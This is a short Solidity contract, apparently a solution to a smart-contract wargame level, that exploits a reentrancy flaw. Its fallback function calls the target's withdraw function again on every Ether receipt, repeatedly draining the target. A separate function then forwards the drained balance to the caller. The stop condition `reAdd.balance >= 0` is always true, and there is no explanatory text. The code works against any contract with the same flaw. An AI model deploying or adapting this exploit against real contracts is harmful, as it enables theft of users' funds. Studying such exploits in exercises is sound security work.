// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface nReentrance {
    function withdraw(uint _value) external;
}

contract Hackrent {
    address payable reAdd;
    nReentrance instance;
    uint _amount = 100 ;

    constructor (address payable _reAdd) public {
        reAdd = _reAdd;
        instance = nReentrance(_reAdd);
    }

    /* function callDonate(address payable _to) payable public {
        instance.donate(_to);
    }

    function deposit() payable public{
        require(msg.value == 10, 'please send 10 wei');
        address(this).transfer(msg.value);
    }
    */
    function callWithdraw() public payable {
        //require(msg.value >= _amount);
        instance.withdraw(_amount);  
    }

    function withdrawBal() public payable {
        address payable receiver = msg.sender;
        //receiver.transfer(address(this).balance);
        (bool result, ) = msg.sender.call.value(address(this).balance)('');
        //require(result, "Failed to send Ether");
        //return result;

        if(!result) {
            revert();
        }
    }

    fallback() external payable {
        require(reAdd.balance >= 0);
        instance.withdraw(_amount);
    }
}